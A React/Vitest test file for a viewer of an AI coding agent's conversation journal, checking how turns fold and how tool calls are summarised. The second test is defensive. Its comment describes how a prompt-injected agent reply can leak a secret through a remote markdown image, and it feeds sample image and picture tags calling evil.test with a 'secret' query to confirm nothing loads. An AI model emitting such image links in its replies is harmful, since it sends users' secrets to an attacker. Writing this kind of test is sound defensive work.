/**
 * The journal as a reader sees it: a finished turn folded to its prompt, its
 * reply and what it took, opening onto its work; the latest turn open, its tool
 * calls folded into one sentence; a question and a plan drawn as cards.
 */
import { fireEvent, render, screen } from "@testing-library/react";
import { expect, it } from "vitest";

import { applyRead } from "../../lib/conversationJournal";
import { conversationItem, conversationRead, SESSION } from "../../test/conversationFixture";
import { AgentItem } from "./Items";
import { TurnList } from "./Turn";
import type { ItemOf } from "./turns";

const journal = applyRead(undefined, conversationRead({ reset: true, items: SESSION }));

it("folds finished turns, keeps the latest open, and draws each kind of call", () => {
  render(<TurnList turns={journal.turns} working={false} />);

  // Before the first prompt: the command, as a chip.
  expect(screen.getByText("/model sonnet")).toBeInTheDocument();

  // The finished turn: its prompt, its reply and its footer — and none of its work.
  expect(screen.getByText("Fix the flaky login test")).toBeInTheDocument();
  expect(screen.getByText("Fixed: the test waits now.")).toBeInTheDocument();
  expect(screen.getByText("Worked for 1m 12s")).toBeInTheDocument();
  expect(screen.getByText("18.2k tokens")).toBeInTheDocument();
  expect(screen.queryByText("Looking at the test first.")).toBeNull();
  expect(screen.queryByText(/^Read 1 file/)).toBeNull();

  // Its step count opens it: the interim prose, the thinking, and the run of
  // calls as one sentence that says what failed.
  fireEvent.click(screen.getByRole("button", { name: /3 steps/ }));
  expect(screen.getByText("Looking at the test first.")).toBeInTheDocument();
  expect(screen.getByText("Thought for 4s")).toBeInTheDocument();
  expect(screen.getByText("Read 1 file, ran 1 command, edited 1 file")).toBeInTheDocument();
  expect(screen.getByText("1 failed")).toBeInTheDocument();

  // The latest turn is open. Its calls are one sentence until opened; the
  // question it asked (with the user's answer) and its plan are cards.
  expect(screen.getByText("Now tidy the helpers")).toBeInTheDocument();
  expect(screen.getByText("Which helpers?")).toBeInTheDocument();
  expect(screen.getByText("Only login")).toBeInTheDocument();
  expect(screen.getByText("Permission mode: plan")).toBeInTheDocument();
  expect(screen.getByRole("heading", { name: "Plan" })).toBeInTheDocument();
  expect(screen.getByText("No answer recorded")).toBeInTheDocument();
  const run = screen.getByRole("button", { name: /Read 2 files, searched once, ran 1 command/ });
  expect(screen.queryByText("…/src/auth/session.ts")).toBeNull();
  fireEvent.click(run);
  expect(screen.getByText("…/src/auth/session.ts")).toBeInTheDocument();
  expect(screen.getByText("retryLogin")).toBeInTheDocument();
  expect(screen.getByText("git status")).toBeInTheDocument();
});

// What an agent writes is attacker-influenceable (a prompt-injected reply), and
// drawing a remote image is a request: `![](https://host/?q=<secret>)` sent the
// secret out just by being shown.
it("draws agent markdown without loading anything from the network", () => {
  const text = [
    "Done. ![chart](https://evil.test/c.png?q=secret)",
    '<picture><source srcset="https://evil.test/p.png"><img src="https://evil.test/i.png" alt="pixel"></picture>',
  ].join("\n\n");
  const item = conversationItem("a-x", 1, 1, { kind: "agent", text }) as ItemOf<"agent">;
  const { container } = render(<AgentItem item={item} />);
  expect(container.querySelector('img[src^="http"], source, picture')).toBeNull();
  // The address is there to read, as text.
  expect(screen.getByText("https://evil.test/c.png?q=secret")).toBeInTheDocument();

  // …and every markdown the view draws is drawn that way.
  const sources = import.meta.glob(["./*.tsx", "!./*.test.tsx"], {
    query: "?raw",
    import: "default",
    eager: true,
  });
  for (const [path, source] of Object.entries(sources)) {
    expect(String(source).match(/<Markdown(?:Document)?\b(?!\s+noRemote\b)/g), path).toBeNull();
  }
});
